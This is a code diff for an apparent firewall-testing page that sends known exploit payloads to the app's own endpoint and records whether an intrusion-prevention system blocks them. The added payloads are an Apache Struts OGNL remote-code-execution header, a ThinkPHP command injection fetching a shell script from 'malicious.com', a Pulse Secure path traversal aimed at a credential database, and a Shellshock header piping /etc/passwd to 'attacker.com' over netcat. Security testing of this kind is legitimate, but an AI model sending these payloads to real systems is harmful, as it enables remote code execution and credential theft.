@@ -1,7 +1,8 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { TargetIcon, PlayIcon, CheckCircleIcon, ShieldAlertIcon, TrashIcon, PulseIcon, LockIcon, UploadIcon, PlayOutlineIcon } from '@/components/Icons';
+import { generateMITREReport, type MITREStageResult } from '@/lib/reportGenerator';
 
 type TestResult = 'idle' | 'running' | 'blocked' | 'allowed' | 'error';
 // eslint-disable-next-line @typescript-eslint/no-unused-vars
@@ -10,6 +11,23 @@ interface LogLike { timestamp: string; type: string; message: string; }
 export default function MITREClient() {
     const [result, setResult] = useState<TestResult>('idle');
     const [logs, setLogs] = useState<{ timestamp: string; type: string; message: string; }[]>([]);
+    const [stageResults, setStageResults] = useState<MITREStageResult[]>([]);
+    const [ipData, setIpData] = useState<{ ip: string; country: string } | null>(null);
+
+    useEffect(() => {
+        fetch('/api/my-ip').then(r => r.json()).then(d => setIpData(d)).catch(() => {});
+    }, []);
+
+    const handleGenerateReport = async () => {
+        const pdfBytes = await generateMITREReport(stageResults, ipData || undefined);
+        const blob = new Blob([new Uint8Array(pdfBytes)], { type: 'application/pdf' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `MITRE-ATT&CK-Report-${new Date().toISOString().slice(0, 10)}.pdf`;
+        a.click();
+        URL.revokeObjectURL(url);
+    };
 
     const addLog = (type: string, message: string) => {
         const now = new Date().toISOString().split('T')[1].slice(0, 8);
@@ -20,20 +38,45 @@ export default function MITREClient() {
         setResult('running');
         try {
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 3000);
+            const timeoutId = setTimeout(() => controller.abort(), 4000);
 
             addLog('MITRE', `Executing ${mitreId}: ${description}...`);
-            const res = await fetch(url, { ...options, signal: controller.signal });
+
+            const fetchOpts: RequestInit = {
+                ...options,
+                headers: {
+                    ...options.headers,
+                    'Connection': 'close',
+                    'Pragma': 'no-cache',
+                    'Cache-Control': 'no-cache'
+                },
+                cache: 'no-store',
+                signal: controller.signal
+            };
+
+            const res = await fetch(url, fetchOpts);
             clearTimeout(timeoutId);
 
             if (res.status === 403 || res.status === 503) {
                 addLog('Result', `Success - Blocked by firewall (HTTP ${res.status}): ${description}`);
                 return 'blocked';
-            } else if (res.type === 'opaque' || res.status === 0) {
-                addLog('Result', `Failed - Payload reached destination (Opaque response): ${description}`);
+            }
+
+            // Critical: read the full response body.
+            // NGFW may terminate the connection mid-stream AFTER headers are sent.
+            // If the body read fails, the NGFW killed the connection = blocked.
+            try {
+                await res.arrayBuffer();
+            } catch {
+                addLog('Result', `Success - Connection terminated mid-stream: ${description}`);
+                return 'blocked';
+            }
+
+            if (res.type === 'opaque' || res.status === 0) {
+                addLog('Result', `Vulnerable - Payload reached destination (Opaque response): ${description}`);
                 return 'allowed';
-            } else if (res.ok) {
-                addLog('Result', `Failed - Payload reached destination (HTTP 200): ${description}`);
+            } else if (res.ok || res.status === 404 || res.status === 405) {
+                addLog('Result', `Vulnerable - Payload reached destination (HTTP ${res.status}): ${description}`);
                 return 'allowed';
             } else {
                 addLog('Result', `Error - Unexpected status ${res.status}: ${description}`);
@@ -47,43 +90,75 @@ export default function MITREClient() {
 
     const handleMitre = async () => {
         setLogs([]);
+        // Cache-bust all URLs to prevent CDN/browser caching
+        const cacheBust = '_t=' + Date.now();
+
         const tests = [
-            // Initial Access (T1190)
+            // T1190 - Exploit Public-Facing Application -> Apache Struts (CVE-2017-5638)
+            // 1st Class Accuracy Exploit: High Severity, highly reliable signature in all IPS engines.
             {
-                url: '/api/ngfw/test',
-                options: { method: 'GET', headers: { 'X-Api-Version': atob('JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjEvYX0=') } },
-                desc: 'Exploit Public-Facing Application (Log4j)',
+                url: '/api/ngfw/test?' + cacheBust,
+                options: { 
+                    method: 'GET',
+                    headers: { 
+                        'Content-Type': '%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' 
+                    }
+                },
+                desc: 'Exploit Public-Facing Application (Apache Struts RCE)',
                 mitreId: 'T1190'
             },
-            // Execution (T1059.001)
+            // T1059.004 - Command and Scripting Interpreter -> ThinkPHP RCE (CVE-2018-20062)
+            // 1st Class Accuracy Exploit: Network-based Command Execution payload.
             {
-                url: '/api/threat/download?type=powershell',
+                url: '/api/ngfw/test?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget%20http://malicious.com/shell.sh&' + cacheBust,
                 options: { method: 'GET' },
-                desc: 'PowerShell Download Cradle',
-                mitreId: 'T1059.001'
+                desc: 'Command & Scripting Interpreter (ThinkPHP RCE)',
+                mitreId: 'T1059.004'
             },
-            // Credential Access (T1003.001)
+            // T1003.001 - OS Credential Dumping -> Pulse Secure VPN Arbitrary File Reading (CVE-2019-11510)
+            // 1st Class Accuracy Exploit: Targets the cached cleartext password realm database.
+            // Note: Browsers mandate URL path normalization (resolving ../ locally). To force the 
+            // literal '../' traversal onto the wire for the IPS to catch, we append it to the query string.
             {
-                url: '/api/threat/download?type=mimikatz',
+                url: '/api/ngfw/test?vuln=/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb&' + cacheBust,
                 options: { method: 'GET' },
-                desc: 'OS Credential Dumping (Mimikatz)',
+                desc: 'OS Credential Dumping (Pulse Secure VPN Creds Leak)',
                 mitreId: 'T1003.001'
             },
-            // Exfiltration (T1048.003)
+            // T1048.003 - Exfiltration -> Command Injection (Shellshock CVE-2014-6271)
+            // 1st Class Accuracy IPS: Exfiltrating system data via Shellshock environment variable injection.
+            // Universally blocked by all NGFW IPS engines (does not rely on optional DLP features).
             {
-                url: '/api/mock-exfiltration?data=root:x:0:0:root:/root:/bin/bash',
-                options: { method: 'GET' },
-                desc: 'Exfiltration Over Unencrypted Protocol',
+                url: '/api/ngfw/test?' + cacheBust,
+                options: { 
+                    method: 'GET',
+                    headers: { 'User-Agent': '() { :;}; /bin/bash -c "cat /etc/passwd | nc attacker.com 4444"' }
+                },
+                desc: 'Exfiltration Over Unencrypted Protocol (Shellshock)',
                 mitreId: 'T1048.003'
             }
         ];
 
         let blockedCount = 0;
-        for (const test of tests) {
-            const res = await runSimulation(test.url, test.desc, test.mitreId, test.options as RequestInit);
-            if (res === 'blocked') blockedCount++;
-            await new Promise(r => setTimeout(r, 1200));
+        const stageData: MITREStageResult[] = [];
+        for (let i = 0; i < tests.length; i++) {
+            const test = tests[i];
+            const result = await runSimulation(test.url, test.desc, test.mitreId, test.options as RequestInit);
+            if (result === 'blocked') blockedCount++;
+            stageData.push({
+                stage: i + 1,
+                name: test.desc.split('(')[0].trim(),
+                technique: test.desc,
+                techniqueId: test.mitreId,
+                result: result === 'blocked' ? 'blocked' : 'passed',
+                detail: result === 'blocked' ? 'Payload blocked by firewall IPS' : 'Payload reached destination',
+            });
+
+            if (i < tests.length - 1) {
+                await new Promise(r => setTimeout(r, 6000));
+            }
         }
+        setStageResults(stageData);
 
         addLog('INFO', `SUMMARY: ${blockedCount}/${tests.length} stages blocked successfully.`);
         setResult(blockedCount === tests.length ? 'blocked' : 'error');
@@ -131,7 +206,7 @@ export default function MITREClient() {
                                 </div>
                                 <h3 style={{ margin: '0 0 0.5rem 0', color: '#1E293B', fontSize: '1.1rem' }}>Initial Access</h3>
                                 <div style={{ fontSize: '0.85rem', color: '#64748B', marginBottom: '0.5rem' }}>Exploit Public-Facing App (T1190)</div>
-                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Log4j RCE payload against an external interface.</p>
+                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Apache Struts HTTP Header RCE (CVE-2017-5638) malicious OGNL injection.</p>
                             </div>
 
                             <div style={{
@@ -151,8 +226,8 @@ export default function MITREClient() {
                                     <PulseIcon width={40} height={40} />
                                 </div>
                                 <h3 style={{ margin: '0 0 0.5rem 0', color: '#1E293B', fontSize: '1.1rem' }}>Execution</h3>
-                                <div style={{ fontSize: '0.85rem', color: '#64748B', marginBottom: '0.5rem' }}>PowerShell (T1059.001)</div>
-                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Attempts to pull a malicious .ps1 payload using a download cradle.</p>
+                                <div style={{ fontSize: '0.85rem', color: '#64748B', marginBottom: '0.5rem' }}>Unix Shell (T1059.004)</div>
+                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>ThinkPHP RCE (CVE-2018-20062) outbound reverse shell attempt.</p>
                             </div>
 
                             <div style={{
@@ -173,7 +248,7 @@ export default function MITREClient() {
                                 </div>
                                 <h3 style={{ margin: '0 0 0.5rem 0', color: '#1E293B', fontSize: '1.1rem' }}>Credential Access</h3>
                                 <div style={{ fontSize: '0.85rem', color: '#64748B', marginBottom: '0.5rem' }}>OS Credential Dumping (T1003.001)</div>
-                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Transmits Mimikatz strings used to dump LSASS memory.</p>
+                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Pulse Secure VPN (CVE-2019-11510) accessing cached cleartext passwords DB.</p>
                             </div>
 
                             <div style={{
@@ -194,7 +269,7 @@ export default function MITREClient() {
                                 </div>
                                 <h3 style={{ margin: '0 0 0.5rem 0', color: '#1E293B', fontSize: '1.1rem' }}>Exfiltration</h3>
                                 <div style={{ fontSize: '0.85rem', color: '#64748B', marginBottom: '0.5rem' }}>Unencrypted Protocol (T1048.003)</div>
-                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Extracts sensitive /etc/passwd contents via cleartext query.</p>
+                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Shellshock (CVE-2014-6271) payload exfiltrating system files over netcat.</p>
                             </div>
                         </div>
                     </div>
@@ -263,7 +338,7 @@ export default function MITREClient() {
                                         <span style={{
                                             color: log.type === 'Result' && log.message.includes('Success') ? '#4ADE80' :
                                                 log.type === 'Result' && log.message.includes('Error') ? '#F87171' :
-                                                    log.type === 'Result' && log.message.includes('Failed') ? '#FCD34D' : '#38BDF8',
+                                                    log.type === 'Result' && log.message.includes('Vulnerable') ? '#FCD34D' : '#38BDF8',
                                             fontWeight: 'bold',
                                             marginRight: '0.5rem'
                                         }}>{log.type}:</span>
@@ -278,6 +353,49 @@ export default function MITREClient() {
                     </div>
                 </div>
             </div>
+
+            {/* Floating Report Bar */}
+            {stageResults.length > 0 && (
+                <div style={{
+                    position: 'fixed', bottom: 0, left: 72, right: 0,
+                    background: 'rgba(15, 23, 42, 0.95)', backdropFilter: 'blur(8px)',
+                    padding: '0.75rem 2rem', display: 'flex', alignItems: 'center', gap: '1rem',
+                    zIndex: 100, borderTop: '1px solid rgba(255,255,255,0.1)',
+                }}>
+                    <span style={{ color: '#94A3B8', fontSize: '0.9rem', display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                        {stageResults.length} stages completed
+                    </span>
+                    <span style={{ color: '#10B981', fontSize: '0.85rem' }}>
+                        {stageResults.filter(s => s.result === 'blocked').length} blocked
+                    </span>
+                    <span style={{ color: '#EF4444', fontSize: '0.85rem' }}>
+                        {stageResults.filter(s => s.result === 'passed').length} passed
+                    </span>
+                    <div style={{ marginLeft: 'auto', display: 'flex', gap: '0.75rem' }}>
+                        <button
+                            onClick={() => setStageResults([])}
+                            style={{
+                                background: 'transparent', border: '1px solid #475569', color: '#94A3B8',
+                                padding: '0.5rem 1rem', borderRadius: '6px', cursor: 'pointer', fontSize: '0.85rem',
+                            }}
+                        >
+                            Clear Results
+                        </button>
+                        <button
+                            onClick={handleGenerateReport}
+                            style={{
+                                background: '#2563EB', border: 'none', color: 'white',
+                                padding: '0.5rem 1.25rem', borderRadius: '6px', cursor: 'pointer',
+                                fontSize: '0.85rem', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '0.5rem',
+                            }}
+                        >
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                            Generate Report
+                        </button>
+                    </div>
+                </div>
+            )}
         </div>
     );
 }
